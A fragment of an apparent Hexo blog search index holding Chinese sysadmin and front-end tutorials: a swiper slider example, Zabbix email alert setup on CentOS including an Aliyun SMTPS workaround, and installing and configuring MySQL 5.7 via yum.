&lt;script type="text/javascript" src="js/zepto.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; alert( $('#div1').html() ); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;23. swiperswiper.js是一款成熟稳定的应用于PC端和移动端的滑动效果插件，一般用来触屏焦点图、触屏整屏滚动等效果。 swiper分为2.x版本和3.x版本，2.x版本支持低版本浏览器(IE7)，3.x放弃支持低版本浏览器，适合应用在移动端。2.x版本中文网址：http://2.swiper.com.cn/3.x版本中文网地址：http://www.swiper.com.cn/1. swiper使用方法123456789101112131415161718192021222324252627282930313233343536&lt;script type="text/javascript" src="js/swiper.min.js"&gt;&lt;/script&gt;&lt;!-- 如果页面引用了jquery或者zepto，就引用 swiper.jquery.min.js,它的容量比swiper.min.js &lt;script src="path/to/swiper.jquery.min.js"&gt;&lt;/script&gt;--&gt;......&lt;link rel="stylesheet" type="text/css" href="css/swiper.min.css"&gt;......&lt;div class="swiper-container"&gt; &lt;div class="swiper-wrapper"&gt; &lt;div class="swiper-slide"&gt;slider1&lt;/div&gt; &lt;div class="swiper-slide"&gt;slider2&lt;/div&gt; &lt;div class="swiper-slide"&gt;slider3&lt;/div&gt; &lt;/div&gt; &lt;div class="swiper-pagination"&gt;&lt;/div&gt; &lt;div class="swiper-button-prev"&gt;&lt;/div&gt; &lt;div class="swiper-button-next"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; var swiper = new Swiper('.swiper-container', &#123; pagination: '.swiper-pagination', prevButton: '.swiper-button-prev', nextButton: '.swiper-button-next', initialSlide :1, paginationClickable: true, loop: true, autoplay:3000, autoplayDisableOnInteraction:false&#125;);&lt;/script&gt;2. swiper使用参数1、initialSlide：初始索引值，从0开始2、direction：滑动方向 horizontal | vertical3、speed：滑动速度，单位ms4、autoplay：设置自动播放及播放时间5、autoplayDisableOnInteraction：用户操作swipe后是否还自动播放，默认是true，不再自动播放6、pagination：分页圆点7、paginationClickable：分页圆点是否点击8、prevButton：上一页箭头9、nextButton：下一页箭头10、loop：是否首尾衔接swiper制作实例swiper制作移动端焦点图实例]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix邮件报警]]></title>
    <url>%2F2019%2F06%2F17%2Fzabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[邮件报警情况分类第一种情况：Zabbix服务端只是单纯的发送报警邮件到指定邮箱，发送报警邮件的这个邮箱账号是Zabbix服务端的本地邮箱账号（例如：root@localhost.localdomain），只能发送，不能接收外部邮件。第二种情况：使用一个可以在互联网上正常收发邮件的邮箱账号（例如：xxx@163.com），通过在Zabbix服务端中设置，使其能够发送报警邮件到指定邮箱。此两种方法，优先使用第一种方法，(收件人邮箱需要添加白名单)使用Zabbix服务端本地邮箱账号发送邮件1. 安装sendmail或者postfix12345# 以sendmail为例，sendmail和postfix只需要安装一个并开启服务即可[root@localhost ~]# yum install sendmail[root@localhost ~]# systemctl start sendmail.service[root@localhost ~]# systemctl enable sendmail.service[root@localhost ~]# systemctl daemon-reload2. 安装邮件发送工具mailx1[root@localhost ~]# yum install mailx3. 测试发送邮件1[root@localhost ~]# echo "zabbix test mail" | mail -s "zabbix" 1103324414@qq.com4. 配置Zabbix服务端邮件报警管理，报警媒介类型，把自带的三个全都给禁用，然后右上角“创建媒体类型”。注意：若上图中的127.0.0.1填写成localhost的话，发送邮件时则会报错：cannot connect to SMTP server [localhost]: cannot connect to [[localhost]:25]: [111] Connection refused备注：SMTP服务器和SMPT HELO填写的是Zabbix监控端主机名称，建议修改，否则使用默认的localhost.localdomain发送邮件会被当做垃圾邮件拦截。5. 设置Zabbix用户报警邮箱地址管理，用户，点击Admin，点击报警媒介，点击添加，在类型中选择上一步添加的媒体类型，在这里选择：“邮件报警”，在收件人中输入收件人邮箱，然后点击添加。5. 设置Zabbix触发报警的动作配置，动作，右上角创建动作，如图所示：1234567891011121314151617181920212223名称：Action-Email默认标题：故障&#123;TRIGGER.STATUS&#125;,服务器:&#123;HOSTNAME1&#125;发生: &#123;TRIGGER.NAME&#125;故障!消息内容： 告警主机:&#123;HOSTNAME1&#125; 告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125; 告警等级:&#123;TRIGGER.SEVERITY&#125; 告警信息: &#123;TRIGGER.NAME&#125; 告警项目:&#123;TRIGGER.KEY1&#125; 问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125; 当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125; 事件ID:&#123;EVENT.ID&#125;恢复主题：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息： 告警主机:&#123;HOSTNAME1&#125; 告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125; 告警等级:&#123;TRIGGER.SEVERITY&#125; 告警信息: &#123;TRIGGER.NAME&#125; 告警项目:&#123;TRIGGER.KEY1&#125; 问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125; 当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125; 事件ID:&#123;EVENT.ID&#125;6. 测试Zabbix报警12# 停止zabbix-agent[root@localhost ~]# systemctl stop zabbix-agent.service报表，动作日志：12# 恢复启动zabbix-agent[root@localhost ~]# systemctl start zabbix-agent.service7. 问题需要先配置好监控主机，尤其是监控项：Agent ping，不然触发动作和测试报警都需要根据实际情况而定在web界面看到报警邮件已送达，但是邮箱里并没有收到邮件，垃圾箱中也没有。但是文件/var/spool/mail/root中有相应的报错信息，暂时不知道如何处理。解决办法：因为被收件邮箱给拦截了，需要添加发件人白名单才能收到邮件：zabbix@localhost.localdomain和zabbix@127.0.0.1使用外部邮箱账号发送报警邮件设置使用外部邮箱账号时，不需要启动sendmail或者postfix。如果在sendmail或者postfix启动的同时使用外部邮箱发送报警邮件，首先会读取外部邮箱。1. 停用sendmail或者postfix1234# 以sendmail为例，sendmail和postfix只需要安装一个并停用服务即可[root@localhost ~]# systemctl stop sendmail.service[root@localhost ~]# systemctl disable sendmail.service[root@localhost ~]# systemctl daemon-reload2. 安装邮件发送工具mailx1[root@localhost ~]# yum install mailx3. 配置Zabbix服务端外部邮箱1234567[root@localhost ~]# vim /etc/mail.rc set sendcharsets=iso-8859-1,utf-8set from=payment@ejubei.cnset smtp=smtp.mxhichina.comset smtp-auth-user=payment@ejubei.cnset smtp-auth-password=xxxxxxxxxset smtp-auth=login4. 测试发送邮件1[root@localhost ~]# echo "zabbix test mail" | mail -s "zabbix" 1103324414@qq.com5. 配置Zabbix服务端邮件报警管理，报警媒介类型，把自带的三个全都给禁用，然后右上角“创建媒体类型”。6. 设置Zabbix用户报警邮箱地址管理，用户，点击Admin，点击报警媒介，点击添加，在类型中选择上一步添加的媒体类型，在这里选择：“Sendmail”，在收件人中输入收件人邮箱，然后点击添加。7. 设置Zabbix触发报警的动作配置，动作，右上角创建动作，如图所示：1234567891011121314151617181920212223名称：Action-Email默认标题：故障&#123;TRIGGER.STATUS&#125;,服务器:&#123;HOSTNAME1&#125;发生: &#123;TRIGGER.NAME&#125;故障!消息内容： 告警主机:&#123;HOSTNAME1&#125; 告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125; 告警等级:&#123;TRIGGER.SEVERITY&#125; 告警信息: &#123;TRIGGER.NAME&#125; 告警项目:&#123;TRIGGER.KEY1&#125; 问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125; 当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125; 事件ID:&#123;EVENT.ID&#125;恢复主题：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息： 告警主机:&#123;HOSTNAME1&#125; 告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125; 告警等级:&#123;TRIGGER.SEVERITY&#125; 告警信息: &#123;TRIGGER.NAME&#125; 告警项目:&#123;TRIGGER.KEY1&#125; 问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125; 当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125; 事件ID:&#123;EVENT.ID&#125;8. 添加Zabbix服务端邮件发送脚本123456789101112131415# 查看默认情况下脚本存放路径[root@localhost ~]# cat /etc/zabbix/zabbix_server.conf | grep 'alert'AlertScriptsPath=/usr/lib/zabbix/alertscripts[root@localhost ~]# cd /usr/lib/zabbix/alertscripts[root@localhost alertscripts]# vim sendmail.sh #!/bin/bashmessages=`echo $3 | tr '\r\n' '\n'`subject=`echo $2 | tr '\r\n' '\n'`echo "$&#123;messages&#125;" | mail -s "$&#123;subject&#125;" $1 &gt;&gt;/tmp/sendmail.log 2&gt;&amp;1[root@localhost ~]# chown zabbix.zabbix /usr/lib/zabbix/alertscripts/sendmail.sh[root@localhost ~]# chmod +x /usr/lib/zabbix/alertscripts/sendmail.sh[root@localhost ~]# chown zabbix.zabbix /tmp/sendmail.log9. 测试Zabbix报警12# 停止zabbix-agent[root@localhost ~]# systemctl stop zabbix-agent.service报表，动作日志：12# 恢复启动zabbix-agent[root@localhost ~]# systemctl start zabbix-agent.service10. 问题需要先配置好监控主机，尤其是监控项：Agent ping，不然触发动作和测试报警都需要根据实际情况而定若zabbix部署在阿里云主机上的问题处理因为阿里云主机默认屏蔽25端口，经测试可以使用ssl的465端口，所以此时采用第二种方法。但是就算使用第二种方法也得做一些其他额外的操作，否则zabbix上提示邮件已送达，但是邮箱收不到邮件。这个额外的办法就是使用465端口来发邮件需要使得ssl证书认证。1. 关闭其它邮件工具12[root@localhost ~]# systemctl stop sendmail.service[root@localhost ~]# systemctl stop postfix.service2. 安装mailx1[root@localhost ~]# yum install mailx3. 注册使用阿里云企业邮箱该步骤实现完成，接下来的步骤都是使用该邮箱作为发件箱4. 请求数字证书因为使用的发件箱是阿里云的企业邮箱，所以向阿里云请求证书，其他步骤操作类似。1234567891011121314[root@localhost ~]# mkdir .certs[root@localhost ~]# echo -n | openssl s_client -connect smtp.mxhichina.com:465 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' &gt; /root/.certs/aliyun.crt[root@localhost ~]# certutil -A -n "GeoTrust SSL CA" -t "C,," -d /root/.certs -i /root/.certs/aliyun.crt[root@localhost ~]# certutil -A -n "GeoTrust Global CA" -t "C,," -d /root/.certs -i /root/.certs/aliyun.crt[root@localhost ~]# certutil -A -n "GeoTrust SSL CA - G3" -t "Pu,Pu,Pu" -d /root/.certs/./ -i /root/.certs/aliyun.crtNotice: Trust flag u is set automatically if the private key is present.[root@localhost ~]# ls /root/.certs/aliyun.crt cert8.db key3.db secmod.db[root@localhost ~]# certutil -L -d /root/.certsCertificate Nickname Trust Attributes SSL,S/MIME,JAR/XPIGeoTrust SSL CA P,P,P5. 配置/etc/mail.rc12345678set sendcharsets=iso-8859-1,utf-8set from=alram@lrcq.com.cnset smtp="smtps://smtp.mxhichina.com:465"set smtp-auth-user=alram@lrcq.com.cnset smtp-auth-password=xxxxxxxxxxxset smtp-auth=loginset ssl-verify=ignoreset nss-config-dir=/root/.certs6. 发送邮件测试1[root@localhost ~]# echo "邮件正文" | mail -s "邮件主题" 1103324414@qq.com7. 证书权限处理这个证书文件是给zabbix用户使用的，如果是在/root/.certs目录下，zabbix用户无法访问，发送邮件时会出现：Error initializing NSS: Unknown error -8015.此时需要把证书移动到zabbix用户可以访问你的地方，比如移动到/etc/zabbix/目录下1234[root@localhost ~]# mv /root/.certs /etc/zabbix/.# 修改/etc/mail.rc文件中的证书路径[root@localhost ~]# vim /etc/mail.rcset nss-config-dir=/etc/zabbix/.certs8. 其他操作管理，报警媒介类型，创建媒介类型配置，用户，点击“Admin”，报警媒介，添加多次添加则可以添加多个收件人配置，动作，创建动作]]></content>
      <categories>
        <category>CentOS</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS7 yum 安装与配置MySQL5.7]]></title>
    <url>%2F2019%2F06%2F14%2FCentOS7%20yum%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AEMySQL5.7%2F</url>
    <content type="text"><![CDATA[1、配置YUM源1234# 安装yum源# yum install http://dev.mysql.com/get/mysql57-community-release-el7-8.noarch.rpm# 检查mysql源是否安装成功# yum repolist enabled | grep "mysql.*-community.*"2. 安装MySQL123456# 安装MySQL# yum install mysql-community-server# 启动# systemctl start mysqld# 查看状态# systemctl status mysqld3. 开机启动12# systemctl enable mysqld# systemctl daemon-reload4. 修改root本地登录密码mysql安装完成之后，在/var/log/mysqld.log文件中给root生成了一个默认密码。通过下面的方式找到root默认密码，然后登录mysql进行修改：1234567# 查看root密码# grep 'temporary password' /var/log/mysqld.log# 登录修改密码# mysql -u root -pALTER USER 'root'@'localhost' IDENTIFIED BY 'nicaimima!@#123';# 修改密码或者使用set password for 'root'@'localhost'=password('nicaimima!@#123');注意：mysql5.7默认安装了密码安全检查插件（validate_password），默认密码检查策略要求密码必须包含：大小写字母、数字和特殊符号，并且长度不能少于8位。否则会提示ERROR 1819 (HY000): Your password does not satisfy the current policy requirements错误。通过msyql环境变量可以查看密码策略的相关信息：1show variables like '%password%';5. 修改密码策略在/etc/my.cnf文件添加validate_password_policy配置，指定密码策略12# 选择0（LOW），1（MEDIUM），2（STRONG）其中一种，选择2需要提供密码字典文件validate_password_policy=0如果不需要密码策略，添加my.cnf文件中添加如下配置禁用即可：1validate_password = off重新启动mysql服务使配置生效：1# systemctl restart mysqld6. 文件相关默认配置文件路径：配置文件：/etc/my.cnf安装路径：/var/lib/mysql日志文件：/var/log/mysqld.log服务启动脚本：/usr/lib/systemd/system/mysqld.servicesocket文件：/var/run/mysqld/mysqld.pid7. 忘记root密码如果忘记root密码，则按如下操作恢复：编辑/etc/my.cnf文件，在[mysqld]的段中加上一句：skip-grant-tables 保存并且退出。123# mysql -u root -p #此时登录不需要密码&gt;&gt;&gt; update mysql.user set authentication_string=password('nicaimima!@#123') where user='root' and Host = 'localhost';&gt;&gt;&gt; flush privileges;]]></content>
      <categories>
        <category>CentOS</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
</search>
